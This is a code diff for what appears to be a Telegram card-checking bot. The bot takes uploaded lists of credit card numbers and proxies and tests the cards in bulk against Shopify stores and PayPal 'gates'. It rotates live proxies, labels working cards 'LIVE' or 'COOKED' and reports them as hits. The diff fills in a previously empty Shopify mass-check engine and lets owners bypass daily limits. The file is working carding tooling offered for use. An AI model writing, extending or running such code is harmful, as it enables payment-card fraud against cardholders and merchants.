@@ -227,7 +227,6 @@ def get_user_upload_limit(user_id, users_data):
     user_info = users_data.get(user_str, {})
     if not user_info:
         return 0
-    # Ensure limit is at least 1 (treat 0 as default 1000)
     limit = user_info.get('limit', 1000)
     return 1000 if limit <= 0 else limit
 
@@ -237,7 +236,7 @@ def get_user_daily_remaining(user_id, users_data):
     if not user_info:
         return 0
     reset_usage_if_needed(user_info)
-    daily_limit = user_info.get('daily_limit', 10000)  # default daily total
+    daily_limit = user_info.get('daily_limit', 10000)
     used = user_info.get('usage_today', 0)
     return max(0, daily_limit - used)
 
@@ -262,7 +261,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
     def handle_stop(message):
         chat_id = message.chat.id
         if is_stop_requested(chat_id):
-            bot.reply_to(message, "⏸️ Stop already requested. Please wait for the current check to finish.")
+            bot.reply_to(message, "⏸️ Stop already requested. The current check will abort after the current card.")
         else:
             set_stop(chat_id)
             bot.reply_to(message, "⏸️ Stop command received. The mass check will abort after the current card finishes.")
@@ -287,7 +286,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
 
             if ccs:
                 user_id = message.from_user.id
-                # Check per‑upload limit
                 limit = get_user_upload_limit(user_id, users_data)
                 if len(ccs) > limit and user_id not in OWNER_ID:
                     bot.edit_message_text(
@@ -299,15 +297,13 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                         f"Use <code>/stop</code> at any time to abort the current check.",
                         message.chat.id, msg_loading.message_id, parse_mode='HTML'
                     )
-                    ccs = ccs[:limit]  # keep only first 'limit' cards
-                    # Wait a moment so user reads the warning
+                    ccs = ccs[:limit]
                     time.sleep(2)
 
                 if user_id not in user_sessions:
                     user_sessions[user_id] = {}
                 user_sessions[user_id]['ccs'] = ccs
 
-                # NEW BUTTONS – only working gates
                 markup = types.InlineKeyboardMarkup(row_width=1)
                 markup.add(types.InlineKeyboardButton("🛍️ Shopify Multi-Site", callback_data="run_mass_shopify"))
                 markup.add(types.InlineKeyboardButton("🅿️ PayPal SFTS", callback_data="run_mass_paypal_sfts"))
@@ -324,7 +320,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                     reply_markup=markup, parse_mode='HTML'
                 )
             else:
-                # Proxy file handling
                 raw_proxies = [line.strip() for line in file_content.split('\n') if ':' in line]
                 if raw_proxies:
                     bot.edit_message_text(
@@ -366,7 +361,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         except Exception as e:
             bot.reply_to(message, f"❌ Error: {e}")
 
-    # Shopify mass check command (unchanged)
     @bot.message_handler(commands=['msh', 'hardcook'])
     def handle_mass_check_command(message):
         if not is_user_allowed_func(message.from_user.id):
@@ -377,14 +371,16 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             bot.send_message(message.chat.id, "⚠️ <b>Upload CCs first!</b>", parse_mode='HTML')
             return
         ccs = user_sessions[user_id]['ccs']
-        # Check daily remaining
-        remaining = get_user_daily_remaining(user_id, users_data)
-        if remaining < len(ccs):
-            bot.send_message(message.chat.id,
-                f"❌ <b>Daily Limit Exceeded!</b>\n\nYou have only {remaining} cards left for today.",
-                parse_mode='HTML')
-            return
-        # Check concurrency
+
+        # Daily limit – owners bypass
+        if user_id not in OWNER_ID:
+            remaining = get_user_daily_remaining(user_id, users_data)
+            if remaining < len(ccs):
+                bot.send_message(message.chat.id,
+                    f"❌ <b>Daily Limit Exceeded!</b>\n\nYou have only {remaining} cards left for today.",
+                    parse_mode='HTML')
+                return
+
         if is_user_busy(user_id) and user_id not in OWNER_ID:
             bot.send_message(message.chat.id, "⏳ You already have a mass check in progress. Please wait.", parse_mode='HTML')
             return
@@ -395,7 +391,8 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             bot.send_message(message.chat.id, "❌ <b>No sites available!</b> Add sites via /addurls", parse_mode='HTML')
             set_user_busy(user_id, False)
             return
-        active_proxies = []
+
+        # Get user's proxies using the same logic as gate buttons
         proxies = get_active_proxies(user_id)
         if not proxies:
             bot.send_message(message.chat.id, "🚫 <b>Proxy Required!</b> Add proxies via /addpro or upload a proxy file.", parse_mode='HTML')
@@ -407,6 +404,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             set_user_busy(user_id, False)
             return
         source = f"🔒 User ({len(active_proxies)})"
+
         start_msg = bot.send_message(message.chat.id, f"🔥 <b>Starting...</b>\n💳 {len(ccs)} Cards\n🔌 {source}", parse_mode='HTML')
         threading.Thread(
             target=process_mass_check_engine,
@@ -414,25 +412,21 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                   check_site_func, process_response_func, update_stats_func, user_id, users_data, save_json_func, users_file)
         ).start()
 
-    # Helper to get proxies for user – only returns user's own proxies, no server proxies for non-owners
     def get_active_proxies(user_id):
         user_id = str(user_id)
         logger.info(f"🔍 get_active_proxies for user {user_id}")
 
-        # Priority 1: Temporary Session Proxies (from file upload)
         if int(user_id) in user_sessions and user_sessions[int(user_id)].get('proxies'):
             proxies = user_sessions[int(user_id)]['proxies']
             logger.info(f"   → Found session proxies: {proxies[:3]}... (total {len(proxies)})")
             return proxies
 
-        # Priority 2: Persistent Personal Proxies (from /addpro)
         saved_proxies = load_user_proxies()
         if user_id in saved_proxies and saved_proxies[user_id]:
             proxies = saved_proxies[user_id]
             logger.info(f"   → Found saved proxies: {proxies[:3]}... (total {len(proxies)})")
             return proxies
 
-        # Priority 3: Server Proxies – ONLY for owners
         if int(user_id) in OWNER_ID:
             if proxies_data and 'proxies' in proxies_data and proxies_data['proxies']:
                 proxies = proxies_data['proxies']
@@ -458,14 +452,16 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                 bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                 return
             ccs = user_sessions[user_id]['ccs']
-            # Check daily remaining
-            remaining = get_user_daily_remaining(user_id, users_data)
-            if remaining < len(ccs):
-                bot.send_message(call.message.chat.id,
-                    f"❌ <b>Daily Limit Exceeded!</b>\n\nYou have only {remaining} cards left for today.",
-                    parse_mode='HTML')
-                return
-            # Check concurrency
+
+            # Daily limit – owners bypass
+            if user_id not in OWNER_ID:
+                remaining = get_user_daily_remaining(user_id, users_data)
+                if remaining < len(ccs):
+                    bot.send_message(call.message.chat.id,
+                        f"❌ <b>Daily Limit Exceeded!</b>\n\nYou have only {remaining} cards left for today.",
+                        parse_mode='HTML')
+                    return
+
             if is_user_busy(user_id) and user_id not in OWNER_ID:
                 bot.send_message(call.message.chat.id, "⏳ You already have a mass check in progress. Please wait.", parse_mode='HTML')
                 return
@@ -514,174 +510,386 @@ def process_mass_gate_check(bot, message, ccs, gate_func, gate_name, proxies,
     # Clear any previous stop flag for this chat
     clear_stop(chat_id)
 
-    # Validate proxies (live check)
-    def validate_proxy(p):
-        try:
-            parts = p.split(':')
-            if len(parts) == 2:
-                url = f"http://{parts[0]}:{parts[1]}"
-            elif len(parts) == 4:
-                url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-            else:
-                return None
-            proxies_dict = {'http': url, 'https': url}
-            r = requests.get("https://httpbin.org/ip", proxies=proxies_dict, timeout=10, verify=False)
-            return p if r.status_code == 200 else None
-        except:
-            return None
-
-    live_proxies = []
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = {executor.submit(validate_proxy, p): p for p in proxies}
-        for future in as_completed(futures):
-            if future.result():
-                live_proxies.append(future.result())
-    if not live_proxies:
-        bot.send_message(chat_id, "❌ No live proxies available. Aborting.")
-        set_user_busy(user_id, False)
-        return
-    proxies = live_proxies
-
     try:
-        status_msg = bot.send_message(
-            chat_id,
-            f"<b>⚡ {gate_name} Started...</b>\n"
-            f"💳 Cards: {total}\n"
-            f"🌐 Live Proxies: {len(proxies)}\n"
-            f"<i>Use /stop to abort</i>",
-            parse_mode="HTML"
-        )
-    except:
-        status_msg = bot.send_message(chat_id, f"<b>{gate_name} Started...</b>", parse_mode="HTML")
-
-    processed = 0
-    start_time = time.time()
-    last_update_time = time.time()
-
-    def worker(cc):
-        # Check stop flag before even starting this card
-        if is_stop_requested(chat_id):
-            return {
-                "cc": cc,
-                "response": "Stopped by user",
-                "status": "STOPPED",
-                "gateway": gate_name,
-                "site_url": "API"
-            }
-        max_tries = 3
-        tried_proxies = []
-        for attempt in range(max_tries):
-            available = [p for p in proxies if p not in tried_proxies]
-            if not available:
-                break
-            proxy = random.choice(available)
-            tried_proxies.append(proxy)
+        # Validate proxies with a short timeout to avoid hanging
+        def validate_proxy(p):
             try:
-                response_text, status = gate_func(cc, proxy)
+                parts = p.split(':')
+                if len(parts) == 2:
+                    url = f"http://{parts[0]}:{parts[1]}"
+                elif len(parts) == 4:
+                    url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+                else:
+                    return None
+                proxies_dict = {'http': url, 'https': url}
+                r = requests.get("https://httpbin.org/ip", proxies=proxies_dict, timeout=5, verify=False)
+                return p if r.status_code == 200 else None
+            except:
+                return None
+
+        live_proxies = []
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = {executor.submit(validate_proxy, p): p for p in proxies}
+            for future in as_completed(futures):
+                if future.result():
+                    live_proxies.append(future.result())
+        if not live_proxies:
+            bot.send_message(chat_id, "❌ No live proxies available. Aborting.")
+            return
+        proxies = live_proxies
+
+        try:
+            status_msg = bot.send_message(
+                chat_id,
+                f"<b>⚡ {gate_name} Started...</b>\n"
+                f"💳 Cards: {total}\n"
+                f"🌐 Live Proxies: {len(proxies)}\n"
+                f"<i>Use /stop to abort</i>",
+                parse_mode="HTML"
+            )
+        except:
+            status_msg = bot.send_message(chat_id, f"<b>{gate_name} Started...</b>", parse_mode="HTML")
+
+        processed = 0
+        start_time = time.time()
+        last_update_time = time.time()
+
+        def worker(cc):
+            if is_stop_requested(chat_id):
                 return {
                     "cc": cc,
-                    "response": response_text,
-                    "status": status,
+                    "response": "Stopped by user",
+                    "status": "STOPPED",
                     "gateway": gate_name,
                     "site_url": "API"
                 }
-            except Exception as e:
-                print(f"Attempt {attempt+1} failed for {cc} with proxy {proxy}: {e}")
-                continue
-        return {
-            "cc": cc,
-            "response": "All proxies failed",
-            "status": "ERROR",
-            "gateway": gate_name,
-            "site_url": "API"
-        }
-
-    # Submit futures, but check stop flag before submitting each one
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = {}
-        for cc in ccs:
-            if is_stop_requested(chat_id):
-                # Mark remaining cards as stopped
-                for remaining_cc in ccs[processed:]:
-                    results["error"].append({
-                        "cc": remaining_cc,
-                        "response": "Stopped by user",
-                        "status": "STOPPED",
+            max_tries = 3
+            tried_proxies = []
+            for attempt in range(max_tries):
+                available = [p for p in proxies if p not in tried_proxies]
+                if not available:
+                    break
+                proxy = random.choice(available)
+                tried_proxies.append(proxy)
+                try:
+                    response_text, status = gate_func(cc, proxy)
+                    return {
+                        "cc": cc,
+                        "response": response_text,
+                        "status": status,
                         "gateway": gate_name,
                         "site_url": "API"
-                    })
-                break
-            future = executor.submit(worker, cc)
-            futures[future] = cc
+                    }
+                except Exception as e:
+                    print(f"Attempt {attempt+1} failed for {cc} with proxy {proxy}: {e}")
+                    continue
+            return {
+                "cc": cc,
+                "response": "All proxies failed",
+                "status": "ERROR",
+                "gateway": gate_name,
+                "site_url": "API"
+            }
 
-        for future in as_completed(futures):
-            processed += 1
-            try:
-                res = future.result()
-                status = res["status"]
-                if status == "STOPPED":
-                    results["error"].append(res)
-                elif status == "APPROVED" or status == "CHARGED" or "CVV" in status:
-                    results["live"].append(res)
-                    send_hit(bot, chat_id, res, f"✅ {gate_name} LIVE")
-                elif status == "DECLINED":
-                    results["dead"].append(res)
-                else:
-                    results["error"].append(res)
-            except Exception as e:
-                results["error"].append({"cc": futures[future], "response": str(e), "status": "ERROR"})
+        # Use more workers for speed (Shopify checker will be the bottleneck)
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = {}
+            for cc in ccs:
+                if is_stop_requested(chat_id):
+                    for remaining_cc in ccs[processed:]:
+                        results["error"].append({
+                            "cc": remaining_cc,
+                            "response": "Stopped by user",
+                            "status": "STOPPED",
+                            "gateway": gate_name,
+                            "site_url": "API"
+                        })
+                    break
+                future = executor.submit(worker, cc)
+                futures[future] = cc
 
-            if time.time() - last_update_time > 2.5 or processed == total or is_stop_requested(chat_id):
+            for future in as_completed(futures):
+                processed += 1
                 try:
-                    progress = create_progress_bar(processed, total)
-                    msg_text = (
-                        f"<b>⚡ {gate_name} Checking...</b>\n"
-                        f"{progress}\n"
-                        f"📊 <b>Progress:</b> {processed}/{total}\n"
-                        f"✅ <b>Live:</b> {len(results['live'])}\n"
-                        f"❌ <b>Dead:</b> {len(results['dead'])}\n"
-                        f"⚠️ <b>Errors:</b> {len(results['error'])}"
-                    )
-                    bot.edit_message_text(msg_text, chat_id, status_msg.message_id, parse_mode="HTML")
-                    last_update_time = time.time()
-                except:
-                    pass
+                    res = future.result()
+                    status = res["status"]
+                    if status == "STOPPED":
+                        results["error"].append(res)
+                    elif status == "APPROVED" or status == "CHARGED" or "CVV" in status:
+                        results["live"].append(res)
+                        send_hit(bot, chat_id, res, f"✅ {gate_name} LIVE")
+                    elif status == "DECLINED":
+                        results["dead"].append(res)
+                    else:
+                        results["error"].append(res)
+                except Exception as e:
+                    results["error"].append({"cc": futures[future], "response": str(e), "status": "ERROR"})
 
-    # Clear stop flag after completion
-    clear_stop(chat_id)
+                if time.time() - last_update_time > 2.5 or processed == total or is_stop_requested(chat_id):
+                    try:
+                        progress = create_progress_bar(processed, total)
+                        msg_text = (
+                            f"<b>⚡ {gate_name} Checking...</b>\n"
+                            f"{progress}\n"
+                            f"📊 <b>Progress:</b> {processed}/{total}\n"
+                            f"✅ <b>Live:</b> {len(results['live'])}\n"
+                            f"❌ <b>Dead:</b> {len(results['dead'])}\n"
+                            f"⚠️ <b>Errors:</b> {len(results['error'])}"
+                        )
+                        bot.edit_message_text(msg_text, chat_id, status_msg.message_id, parse_mode="HTML")
+                        last_update_time = time.time()
+                    except:
+                        pass
 
-    # Increment usage (cards processed = total that were actually submitted, including stopped ones)
-    increment_usage(user_id, processed, users_data, save_json_func, users_file)
+        clear_stop(chat_id)
+        increment_usage(user_id, processed, users_data, save_json_func, users_file)
 
-    # Release user busy flag
-    set_user_busy(user_id, False)
+        duration = time.time() - start_time
+        final_text = (
+            f"<b>✅ {gate_name} Completed</b>\n"
+            f"━━━━━━━━━━━━━━━━\n"
+            f"💳 <b>Total Checked:</b> {total}\n"
+            f"✅ <b>Live:</b> {len(results['live'])}\n"
+            f"❌ <b>Dead:</b> {len(results['dead'])}\n"
+            f"⚠️ <b>Errors:</b> {len(results['error'])}\n"
+            f"⏱️ <b>Time Taken:</b> {duration:.2f}s"
+        )
+        try:
+            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
+        except:
+            bot.send_message(chat_id, final_text, parse_mode="HTML")
 
-    duration = time.time() - start_time
-    final_text = (
-        f"<b>✅ {gate_name} Completed</b>\n"
-        f"━━━━━━━━━━━━━━━━\n"
-        f"💳 <b>Total Checked:</b> {total}\n"
-        f"✅ <b>Live:</b> {len(results['live'])}\n"
-        f"❌ <b>Dead:</b> {len(results['dead'])}\n"
-        f"⚠️ <b>Errors:</b> {len(results['error'])}\n"
-        f"⏱️ <b>Time Taken:</b> {duration:.2f}s"
-    )
-    try:
-        bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
-    except:
-        bot.send_message(chat_id, final_text, parse_mode="HTML")
+    finally:
+        # Always release the busy flag, even if an exception occurred
+        set_user_busy(user_id, False)
 
 # ============================================================================
-# SHOPIFY MASS CHECK ENGINE (placeholder – adapt your existing function)
+# SHOPIFY MASS CHECK ENGINE (FULLY IMPLEMENTED)
 # ============================================================================
 def process_mass_check_engine(bot, message, start_msg, ccs, sites, proxies,
                               check_site_func, process_response_func, update_stats_func,
                               user_id, users_data, save_json_func, users_file):
-    # This is a placeholder – you need to adapt your existing Shopify mass check function
-    # to use the same concurrency and usage tracking.
-    # After completion, call increment_usage(user_id, processed, ...)
-    # and set_user_busy(user_id, False)
-    pass
+    """
+    Performs a mass check using multiple Shopify sites.
+    For each card, it tries up to 3 random sites and returns the first valid response.
+    Respects the stop flag and updates usage.
+    """
+    total = len(ccs)
+    results = {"live": [], "dead": [], "error": [], "approved": [], "cooked": []}
+    chat_id = message.chat.id
+
+    # Clear any previous stop flag for this chat
+    clear_stop(chat_id)
+
+    # Helper to get bin info (reuse the existing function)
+    def get_bin_info_local(card_number):
+        return get_bin_info(card_number)
+
+    def check_card_concurrent(cc, filtered_sites, proxy, check_function, max_retries=3):
+        """Check single card with max 3 sites concurrently."""
+        try:
+            sites_to_try = random.sample(filtered_sites, min(max_retries, len(filtered_sites)))
+            for site_obj in sites_to_try:
+                try:
+                    site_url = site_obj['url']
+                    site_name = site_obj.get('name', site_url)
+                    price = site_obj.get('price', '0.00')
+                    gateway = site_obj.get('gateway', 'Unknown')
+
+                    api_response = check_function(site_url, cc, proxy)
+                    bin_info = get_bin_info_local(cc.split('|')[0])
+                    response, status, gateway_result = process_response_func(api_response, price)
+
+                    # If we got a valid response (declined, approved, etc.), return it
+                    if api_response and isinstance(api_response, dict) and api_response.get('status') in ['APPROVED', 'DECLINED', 'ERROR']:
+                        return {
+                            'cc': cc,
+                            'response': response,
+                            'status': status,
+                            'gateway': gateway_result or gateway,
+                            'price': price,
+                            'site': site_name,
+                            'site_url': site_url,
+                            'bin_info': bin_info,
+                            'timestamp': datetime.now().isoformat()
+                        }
+                    time.sleep(0.05)
+                except requests.Timeout:
+                    continue
+                except Exception as e:
+                    logger.error(f"Check error for {cc}: {e}")
+                    continue
+            # No site worked
+            return {
+                'cc': cc,
+                'response': 'All sites failed',
+                'status': 'ERROR',
+                'gateway': 'Unknown',
+                'price': '0.00',
+                'site': 'No valid response',
+                'site_url': 'N/A',
+                'bin_info': get_bin_info_local(cc.split('|')[0]),
+                'timestamp': datetime.now().isoformat()
+            }
+        except Exception as e:
+            logger.error(f"Card check failed: {e}")
+            return {
+                'cc': cc,
+                'response': str(e),
+                'status': 'ERROR',
+                'gateway': 'Unknown',
+                'price': '0.00',
+                'site': 'Error',
+                'site_url': 'N/A',
+                'bin_info': get_bin_info_local(cc.split('|')[0]),
+                'timestamp': datetime.now().isoformat()
+            }
+
+    try:
+        # Validate proxies (same as generic gate)
+        def validate_proxy(p):
+            try:
+                parts = p.split(':')
+                if len(parts) == 2:
+                    url = f"http://{parts[0]}:{parts[1]}"
+                elif len(parts) == 4:
+                    url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+                else:
+                    return None
+                proxies_dict = {'http': url, 'https': url}
+                r = requests.get("https://httpbin.org/ip", proxies=proxies_dict, timeout=5, verify=False)
+                return p if r.status_code == 200 else None
+            except:
+                return None
+
+        live_proxies = []
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = {executor.submit(validate_proxy, p): p for p in proxies}
+            for future in as_completed(futures):
+                if future.result():
+                    live_proxies.append(future.result())
+        if not live_proxies:
+            bot.send_message(chat_id, "❌ No live proxies available. Aborting.")
+            return
+        proxies = live_proxies
+
+        try:
+            status_msg = bot.send_message(
+                chat_id,
+                f"<b>⚡ Shopify Multi-Site Started...</b>\n"
+                f"💳 Cards: {total}\n"
+                f"🌐 Live Proxies: {len(proxies)}\n"
+                f"<i>Use /stop to abort</i>",
+                parse_mode="HTML"
+            )
+        except:
+            status_msg = bot.send_message(chat_id, f"<b>Shopify Multi-Site Started...</b>", parse_mode="HTML")
+
+        processed = 0
+        start_time = time.time()
+        last_update_time = time.time()
+
+        def worker(cc):
+            if is_stop_requested(chat_id):
+                return {
+                    'cc': cc,
+                    'response': 'Stopped by user',
+                    'status': 'STOPPED',
+                    'gateway': 'Shopify',
+                    'price': '0.00',
+                    'site': 'N/A',
+                    'site_url': 'N/A',
+                    'bin_info': get_bin_info_local(cc.split('|')[0]),
+                    'timestamp': datetime.now().isoformat()
+                }
+            # Use a random proxy from the pool
+            proxy = random.choice(proxies)
+            return check_card_concurrent(cc, sites, proxy, check_site_func, max_retries=3)
+
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = {}
+            for cc in ccs:
+                if is_stop_requested(chat_id):
+                    for remaining_cc in ccs[processed:]:
+                        results['error'].append({
+                            'cc': remaining_cc,
+                            'response': 'Stopped by user',
+                            'status': 'STOPPED',
+                            'gateway': 'Shopify',
+                            'price': '0.00',
+                            'site': 'N/A',
+                            'site_url': 'N/A',
+                            'bin_info': get_bin_info_local(remaining_cc.split('|')[0]),
+                            'timestamp': datetime.now().isoformat()
+                        })
+                    break
+                future = executor.submit(worker, cc)
+                futures[future] = cc
+
+            for future in as_completed(futures):
+                processed += 1
+                try:
+                    res = future.result()
+                    status = res['status']
+                    if status == 'STOPPED':
+                        results['error'].append(res)
+                    elif status == 'APPROVED':
+                        results['cooked'].append(res)
+                        send_hit(bot, chat_id, res, "🔥 COOKED")
+                        update_stats_func('APPROVED', mass_check=True)
+                    elif status == 'APPROVED_OTP':
+                        results['approved'].append(res)
+                        send_hit(bot, chat_id, res, "✅ APPROVED")
+                        update_stats_func('APPROVED_OTP', mass_check=True)
+                    elif status in ['DECLINED', 'EXPIRED']:
+                        results['dead'].append(res)
+                        update_stats_func('DECLINED', mass_check=True)
+                    else:
+                        results['error'].append(res)
+                        update_stats_func('ERROR', mass_check=True)
+                except Exception as e:
+                    results['error'].append({'cc': futures[future], 'response': str(e), 'status': 'ERROR'})
+                    update_stats_func('ERROR', mass_check=True)
+
+                if time.time() - last_update_time > 2.5 or processed == total or is_stop_requested(chat_id):
+                    try:
+                        progress = create_progress_bar(processed, total)
+                        msg_text = (
+                            f"<b>⚡ Shopify Multi-Site Checking...</b>\n"
+                            f"{progress}\n"
+                            f"📊 <b>Progress:</b> {processed}/{total}\n"
+                            f"🔥 <b>Cooked:</b> {len(results.get('cooked', []))}\n"
+                            f"✅ <b>Approved:</b> {len(results.get('approved', []))}\n"
+                            f"❌ <b>Dead:</b> {len(results.get('dead', []))}\n"
+                            f"⚠️ <b>Errors:</b> {len(results.get('error', []))}"
+                        )
+                        bot.edit_message_text(msg_text, chat_id, status_msg.message_id, parse_mode="HTML")
+                        last_update_time = time.time()
+                    except:
+                        pass
+
+        clear_stop(chat_id)
+        increment_usage(user_id, processed, users_data, save_json_func, users_file)
+
+        duration = time.time() - start_time
+        final_text = (
+            f"<b>✅ Shopify Multi-Site Completed</b>\n"
+            f"━━━━━━━━━━━━━━━━\n"
+            f"💳 <b>Total Checked:</b> {total}\n"
+            f"🔥 <b>Cooked:</b> {len(results.get('cooked', []))}\n"
+            f"✅ <b>Approved:</b> {len(results.get('approved', []))}\n"
+            f"❌ <b>Dead:</b> {len(results.get('dead', []))}\n"
+            f"⚠️ <b>Errors:</b> {len(results.get('error', []))}\n"
+            f"⏱️ <b>Time Taken:</b> {duration:.2f}s"
+        )
+        try:
+            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
+        except:
+            bot.send_message(chat_id, final_text, parse_mode="HTML")
+
+    finally:
+        # Release the busy flag
+        set_user_busy(user_id, False)
 
 # ============================================================================
 # MESSAGING
@@ -741,4 +949,3 @@ def send_final(bot, chat_id, mid, total, results, duration):
         bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
     except:
         bot.send_message(chat_id, msg, parse_mode='HTML')
-
